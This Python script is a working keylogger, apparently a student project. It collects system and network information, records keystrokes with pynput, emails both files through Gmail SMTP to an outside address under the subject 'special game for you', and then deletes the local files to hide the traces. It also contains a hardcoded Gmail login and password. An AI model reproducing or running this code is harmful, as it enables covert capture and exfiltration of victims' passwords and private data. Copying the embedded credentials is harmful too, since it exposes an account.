from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import pynput
from pynput.keyboard import Key, Listener
import time
import os

system_information = "system.txt"
keys_information = "key_log.txt"
extend = "\\"


file_path =r"C:\Users\TANUSHKA\Pictures\project\wap"

time_iteration = 15
number_of_iterations_end = 1

def send_email(filename, attachment):

    fromaddr ="wapprojecttool@gmail.com"
    toaddr = "gamesareforeverrememberthat@gmail.com"
    msg = MIMEMultipart()

    
    msg['From'] ="wapprojecttool@gmail.com"

    
    msg['To'] ="gamesareforeverrememberthat@gmail.com"

    
    msg['Subject'] = "special game for you"

    body = "Body_of_the_mail"

  
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    
    s.starttls()

    # Authentication
    s.login('wapprojecttool@gmail.com','WAPROCKS')

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

# Get Computer and Network Information
def computer_information():
    with open(file_path + extend+ system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")
computer_information()
send_email(system_information, file_path + extend + system_information)

# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
    
        send_email(keys_information, file_path + extend + keys_information)
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        
        number_of_iterations += 1
        # Update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


time.sleep(100) 
delete_files = [system_information,keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)
            


            
